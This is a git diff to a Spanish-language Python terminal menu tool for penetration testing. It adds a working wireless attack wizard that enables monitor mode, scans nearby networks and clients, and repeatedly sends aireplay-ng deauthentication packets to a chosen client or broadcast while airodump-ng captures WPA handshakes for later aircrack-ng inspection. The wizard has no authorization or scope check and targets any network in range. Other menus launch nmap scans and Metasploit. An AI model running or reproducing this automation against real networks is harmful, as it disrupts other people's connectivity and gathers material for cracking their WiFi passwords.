@@ -3,6 +3,10 @@ import subprocess
 import os
 import socket
 from datetime import datetime
+import csv
+import time
+
+BASE_DIR_WIFI = "Resultados_Handshake"
 
 # ==========================================
 # 0. CONFIGURACIÓN INICIAL Y DE SESIÓN
@@ -230,7 +234,7 @@ class AplicacionTUI:
                 break 
 
 # ==========================================
-# 5. GENERADORES DINÁMICOS PARA EL EXPLORADOR (NUEVO)
+# 5. GENERADORES DINÁMICOS PARA EL EXPLORADOR 
 # ==========================================
 def generar_menu_archivos(ruta_carpeta):
     """Escanea los archivos .txt dentro de una auditoría y crea un menú para leerlos"""
@@ -273,6 +277,7 @@ def generar_menu_carpetas():
         menu.agregar_opcion(f"{carpeta}", AccionMenuDinamico(carpeta, lambda r=ruta_carpeta: generar_menu_archivos(r)))
 
     return menu
+
 
 # ==========================================
 # GESTIÓN DE MACCHANGER
@@ -331,6 +336,187 @@ def generar_menu_interfaces():
     return menu
 
 # ==========================================
+# GESTIÓN DE AUDITORÍA INALÁMBRICA (WIFI)
+# ==========================================
+def habilitar_modo_monitor(interfaz):
+    """Mata procesos conflictivos y levanta la interfaz en modo monitor"""
+    print(f"[*] Preparando la interfaz {interfaz} para modo monitor...")
+    os.system("sudo airmon-ng check kill")
+    os.system(f"sudo airmon-ng start {interfaz}")
+    print(f"\n[+] Interfaz configurada. Normalmente cambia de nombre (ej. {interfaz}mon o wlan0mon).")
+    print("\nVerifica el nuevo nombre con ifconfig o en el menú de selección.")
+
+def generar_menu_monitor():
+    """Genera menú con interfaces disponibles para poner en modo monitor"""
+    menu = Menu("ACTIVAR MODO MONITOR")
+    interfaces = obtener_interfaces() # Reutilizamos la función de macchanger
+    if not interfaces:
+        menu.agregar_opcion("No se encontraron interfaces", AccionBash("Error", "echo 'No hay interfaces de red detectadas.'"))
+        return menu
+    for iface in interfaces:
+        menu.agregar_opcion(f"Poner {iface} en modo monitor", AccionPython(f"Monitor {iface}", habilitar_modo_monitor, iface))
+    return menu
+
+def wizard_captura_handshake():
+    """Ejecuta la captura interactiva sin requerir teclear BSSIDs o MACs"""
+    interfaces = obtener_interfaces()
+    print("=== ASISTENTE DE CAPTURA DE HANDSHAKE ===")
+    print("Interfaces disponibles:")
+    for i, iface in enumerate(interfaces):
+        print(f"[{i}] {iface}")
+    
+    try:
+        idx_iface = int(input("\n[-] Selecciona el número de tu interfaz en modo monitor: "))
+        interfaz = interfaces[idx_iface]
+    except (ValueError, IndexError):
+        print("[-] Selección inválida.")
+        return
+
+    # Escaneo rápido para recolectar BSSIDs
+    print(f"\n[*] Iniciando escaneo rápido de 10 segundos en {interfaz}...")
+    scan_base = "/tmp/wifi_scan"
+    os.system(f"sudo rm -f {scan_base}-01.csv")
+    
+    # timeout detiene airodump-ng tras 10 segundos
+    os.system(f"sudo timeout 10s airodump-ng {interfaz} -w {scan_base} --output-format csv > /dev/null 2>&1")
+
+    redes = []
+    clientes = []
+    
+    # Parseo del CSV de Airodump
+    try:
+        with open(f"{scan_base}-01.csv", "r", encoding="utf-8", errors="ignore") as f:
+            contenido = f.read()
+            partes = contenido.split("Station MAC,")
+            
+            # Extraer Redes (APs)
+            lineas_redes = partes[0].split("\n")[2:] 
+            for linea in lineas_redes:
+                row = linea.split(",")
+                if len(row) >= 14 and ":" in row[0]:
+                    redes.append({
+                        "bssid": row[0].strip(),
+                        "ch": row[3].strip(),
+                        "essid": row[13].strip() if row[13].strip() else "<Oculta>"
+                    })
+                    
+            # Extraer Clientes (Stations)
+            if len(partes) > 1:
+                lineas_clientes = partes[1].split("\n")[1:]
+                for linea in lineas_clientes:
+                    row = linea.split(",")
+                    if len(row) >= 6 and ":" in row[0]:
+                        clientes.append({
+                            "mac": row[0].strip(),
+                            "bssid": row[5].strip()
+                        })
+    except Exception as e:
+        print(f"[-] Error leyendo el escaneo: {e}")
+        return
+
+    if not redes:
+        print("[-] No se encontraron redes en los alrededores.")
+        return
+
+    print("\n[-] Redes encontradas:")
+    for i, red in enumerate(redes):
+        print(f"[{i}] {red['essid']} (BSSID: {red['bssid']} | Canal: {red['ch']})")
+
+    try:
+        idx_red = int(input("\n[-] Selecciona el número de la red a auditar: "))
+        target = redes[idx_red]
+    except (ValueError, IndexError):
+        print("[-] Selección inválida.")
+        return
+
+    # Filtrar clientes asociados a esta red
+    clientes_objetivo = [c["mac"] for c in clientes if c["bssid"] == target["bssid"]]
+    
+    station = "FF:FF:FF:FF:FF:FF" # Por defecto Broadcast
+    if clientes_objetivo:
+        print("\n[-] Clientes conectados detectados:")
+        print("[0] Enviar a todos (Broadcast FF:FF:FF:FF:FF:FF)")
+        for i, c_mac in enumerate(clientes_objetivo, 1):
+            print(f"[{i}] {c_mac}")
+        
+        try:
+            idx_cliente = int(input("\n[-] Selecciona el número del cliente a desautenticar: "))
+            if idx_cliente > 0:
+                station = clientes_objetivo[idx_cliente - 1]
+        except (ValueError, IndexError):
+            pass
+    else:
+        print("\n[!] No se detectaron clientes. Se enviarán paquetes Broadcast.")
+
+    # Crear carpeta dinámica de sesión
+    timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+    session_dir = f"{BASE_DIR_WIFI}/Auditoria-{timestamp}"
+    os.makedirs(session_dir, exist_ok=True)
+
+    print(f"\n[*] Abriendo airodump-ng en 'kitty' para capturar el handshake...")
+    comando_airodump = f"kitty --hold bash -c 'sudo airodump-ng --channel {target['ch']} --bssid {target['bssid']} -w {session_dir}/Captura {interfaz}; exec bash' 2>/dev/null &"
+    os.system(comando_airodump)
+
+    # Bucle de desautenticación
+    time.sleep(2) # Darle tiempo a kitty de abrir
+    while True:
+        print(f"\n[*] Lanzando ataque de desautenticación a {station}...")
+        os.system(f"sudo aireplay-ng -0 9 -a {target['bssid']} -c {station} {interfaz}")
+
+        repetir = input("\n[?] ¿Desea volver a enviar paquetes? (y/n): ").strip().lower()
+        if repetir != 'y':
+            break
+
+    print(f"\n[+] Auditoría finalizada. Handshakes guardados en {session_dir}/")
+    os.system("pkill -f 'kitty.*airodump-ng'") 
+
+# ==========================================
+# EXPLORADOR DE HANDSHAKES
+# ==========================================
+def generar_menu_archivos_wifi(ruta_carpeta):
+    nombre_carpeta = os.path.basename(ruta_carpeta)
+    menu = Menu(f"ARCHIVOS EN {nombre_carpeta}")
+    try:
+        archivos = sorted([f for f in os.listdir(ruta_carpeta) if os.path.isfile(os.path.join(ruta_carpeta, f))])
+    except Exception:
+        archivos = []
+
+    if not archivos:
+        menu.agregar_opcion("Carpeta vacía", AccionBash("Vacío", "echo 'No hay capturas aquí.'"))
+        return menu
+
+    for archivo in archivos:
+        ruta_archivo = os.path.join(ruta_carpeta, archivo)
+        # Si es .cap o .csv usamos ls -l o aircrack-ng para inspeccionarlo, si es txt lo leemos
+        if archivo.endswith('.cap'):
+            menu.agregar_opcion(f"{archivo} (Ver Info)", AccionBash("Aircrack Info", f"aircrack-ng '{ruta_archivo}'"))
+        else:
+            menu.agregar_opcion(f"{archivo} (Leer)", AccionBash(f"Leyendo {archivo}", f"less '{ruta_archivo}'"))
+
+    # Agregamos la opción de abrir Ranger directamente en esta carpeta
+    menu.agregar_opcion("=> ABRIR CARPETA EN RANGER <=", AccionBash("Ranger", f"ranger '{ruta_carpeta}'"))
+    return menu
+
+def generar_menu_carpetas_wifi():
+    menu = Menu("CAPTURAS HANDSHAKE GUARDADAS")
+    if not os.path.exists(BASE_DIR_WIFI):
+        menu.agregar_opcion("Directorio vacío", AccionBash("Vacío", "echo 'Realiza una captura primero.'"))
+        return menu
+    carpetas = sorted([d for d in os.listdir(BASE_DIR_WIFI) if os.path.isdir(os.path.join(BASE_DIR_WIFI, d))], reverse=True)
+    if not carpetas:
+        menu.agregar_opcion("No hay auditorías", AccionBash("Vacío", "echo 'No se encontraron auditorías.'"))
+        return menu
+
+    for carpeta in carpetas:
+        ruta_carpeta = os.path.join(BASE_DIR_WIFI, carpeta)
+        menu.agregar_opcion(f"{carpeta}", AccionMenuDinamico(carpeta, lambda r=ruta_carpeta: generar_menu_archivos_wifi(r)))
+    
+    # Explorar directorio raíz con ranger
+    menu.agregar_opcion("=> EXPLORAR TODO CON RANGER <=", AccionBash("Ranger Root", f"ranger '{BASE_DIR_WIFI}'"))
+    return menu
+
+
+# ==========================================
 # 6. ÁRBOL DE MENÚS Y COMPILACIÓN
 # ==========================================
 def main(stdscr):
@@ -362,23 +548,28 @@ def main(stdscr):
                f"echo '[+] Batería completada. Resultados en {SESSION_DIR}/'"
     menu_nmap.agregar_opcion("Escaneo completo automatizado", AccionBash("Automated Scan", cmd_auto))
     
-    # Aquí inyectamos el nuevo explorador de archivos basado en menús
     menu_nmap.agregar_opcion("=> LEER RESULTADOS GUARDADOS <=", AccionMenuDinamico("Explorador", generar_menu_carpetas))
+
+# ==========================================
+# MENU ESCANE0 DE PUERTOS
+# ==========================================
 
     menu_reconocimiento = Menu("RECONOCIMIENTO (Information Gathering)")
     menu_reconocimiento.agregar_opcion("Mostrar Objetivo Actual", AccionBash("Echo Target", "echo 'El objetivo configurado actualmente es: {TARGET}'"))
     menu_reconocimiento.agregar_opcion("Configurar Objetivo / Rango", menu_objetivo)
     menu_reconocimiento.agregar_opcion("Menú de Auditoría Nmap (14 Modos)", menu_nmap) 
 
-
-
-
-
-
+# ==========================================
+# MENU AUDITORIA INALAMBRICA
+# ==========================================
 
     menu_wireless = Menu("AUDITORÍA INALÁMBRICA (WiFi)")
-    menu_wireless.agregar_opcion("Activar Modo Monitor", AccionBash("Airmon-ng", "echo 'Simulando: airmon-ng start wlan0'"))
-    menu_wireless.agregar_opcion("Escanear Redes (Airodump-ng)", AccionBash("Airodump", "echo 'Simulando: airodump-ng wlan0mon'"))
+    menu_wireless.agregar_opcion("1. Activar Modo Monitor (Seleccionar Interfaz)", AccionMenuDinamico("Modo Monitor", generar_menu_monitor))
+    menu_wireless.agregar_opcion("2. Iniciar Captura Automatizada de Handshake", AccionPython("Captura WiFi", wizard_captura_handshake))
+    menu_wireless.agregar_opcion("3. Explorador de Capturas (Visor TUI y Ranger)", AccionMenuDinamico("Explorador WiFi", generar_menu_carpetas_wifi))
+
+
+
 
     menu_explotacion = Menu("EXPLOTACIÓN Y POST-EXPLOTACIÓN") 
     menu_explotacion.agregar_opcion("Iniciar Metasploit Framework", AccionBash("MSFConsole", "msfconsole -q -x 'help'"))
